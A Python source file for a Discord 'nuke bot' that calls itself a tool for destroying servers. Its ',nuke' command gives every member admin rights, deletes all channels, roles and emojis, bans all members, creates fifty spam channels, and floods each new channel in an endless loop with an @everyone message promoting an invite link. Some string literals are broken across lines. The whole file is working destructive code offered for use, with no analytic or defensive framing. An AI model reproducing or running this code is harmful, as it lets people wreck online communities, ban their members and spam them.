import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

SPAM_CHANNEL = ["Fucked by Vishall XD"]
SPAM_MESSAGE = ["@everyone Joining a recovery server: https://discord.gg/UFvjK5Uy5e"]

client = commands.Bot(command_prefix=",")

@client.event
async def on_ready():
    print(Fore.MAGENTA + 'VISHALS Nuke Bot is on!! Do (Prefix) to nuke discord servers!!' + Fore.RESET)
    await client.change_presence(
        activity=discord.Game(name="BIO HERE")
      )

@client.command()
async def nuke(ctx):
        await ctx.message.delete()
        guild = ctx.guild
        try:
            role = discord.utils.get(guild.roles, name = "@everyone")
            await role.edit(permissions = Permissions.all())
            print(Fore.BLUE + "[+] Gave Everyone Admin" + 
Fore.RESET)



        except:
            print(Fore.CYAN + "Vishal Runs You" + Fore.RESET)
        for channel in guild.channels:
            try:
                await channel.delete()
                print(Fore.BLUE + f" [+] {channel.name} Was Deleted." +
Fore.RESET)
            except:
                print(Fore.GREEN + f" [-] {channel.name} Was Not 
Deleted." + Fore.RESET)
        for member in guild.members:
          try:
              await member.ban()
              print(Fore.BLUE + f" [+] 
{member.name}#{member.discriminator} Was Banned" + 
Fore.RESET)
          except:
              print(Fore.BLUE + f" [-]
{member.name}#{member.discriminator} Was Not Banned." + 
Fore.RESET)
        for role in guild.roles:
          try:
              await role.delete()
              print(Fore.BLUE + f" [+] {role.name} Was Deleted" + 
Fore.RESET)
          except:
              print(Fore.RED + f" [-] {role.name} Was Not Deleted" + 
Fore.RESET)
        for emoji in list(ctx.guild.emojis):
          try:



              await emoji.delete()
              print(Fore.BLUE + f" [+] {emoji.name} Was Deleted" + 
Fore.RESET)
          except:
              print(Fore.RED + f" [-] {emoji.name} Was Not Deleted" + 
Fore.RESET)
        banned_users = await guild.bans()
        for ban_entry in banned_users:
            user = ban_entry.user
            try:
                await user.unban("YOUR ID")
                print(Fore.RED + f" [-] {user.name}#{user.discriminator}
Was Unbanned." + Fore.RESET)
            except:
                print(Fore.BLUE + f" [+] 
{user.name}#{user.discriminator} Was Not Unbanned." + 
Fore.RESET)
        await guild.create_text_channel("vishals nukebot")
        for channel in guild.text_channels:
                link = await channel.create_invite(max_age = 0, 
max_uses = 0)
                print(f"New Invite: {link}")
        amount = 50
        for i in range(amount):
              await 
guild.create_text_channel(random.choice(SPAM_CHANNEL))
        print(f"Nuked {guild.name} vishal Nuker Runs You")
        return

@client.event



async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))

client.run("YOUR_BOT_TOKEN")
